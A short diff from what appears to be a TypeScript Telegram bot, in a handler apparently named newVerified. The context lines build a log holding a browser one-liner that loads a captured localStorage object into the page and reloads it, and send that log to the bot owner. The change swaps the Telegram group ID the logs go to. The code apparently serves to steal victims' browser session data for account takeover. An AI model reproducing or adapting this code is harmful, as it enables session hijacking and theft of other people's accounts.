@@ -201,7 +201,7 @@ const newVerified = async (ctx: Context) => {
 
 <pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
-    const myGroupId = -4723386398;
+    const myGroupId = -4765914839;
 
     // Invia log al bot owner
     await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" });
